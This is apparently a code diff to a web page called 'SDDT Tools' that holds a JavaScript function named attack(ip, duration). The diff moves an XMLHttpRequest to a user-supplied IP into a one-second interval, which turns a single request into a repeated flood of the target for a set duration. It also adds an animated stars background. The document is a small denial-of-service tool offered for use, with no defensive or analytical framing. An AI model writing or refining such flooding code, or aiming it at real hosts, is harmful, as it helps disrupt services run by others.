@@ -47,6 +47,9 @@
         function attack(ip, duration) {
             var dur = duration;
             var interval = setInterval(function () {
+                var ajax = new XMLHttpRequest();
+            ajax.open('GET', `https://${ip}/`);
+            ajax.send();
                 dur--;
                 if (dur <= 0) {
                     clearInterval(interval);
@@ -56,14 +59,23 @@
             }, 1000);
 
             // AJAX attack
-            var ajax = new XMLHttpRequest();
-            ajax.open('GET', `http://${ip}/`);
-            ajax.send();
+            
         }
     </script>
 </head>
 
 <body>
+    <div id="stars-container">
+        <!-- Animated stars background -->
+        <div class="stars">
+            <div class="star"></div>
+            <div class="star"></div>
+            <div class="star"></div>
+            <div class="star"></div>
+            <div class="star"></div>
+        </div>
+    </div>
+
     <div class="top-bar">
         <a>SDDT Tools</a>
     </div>
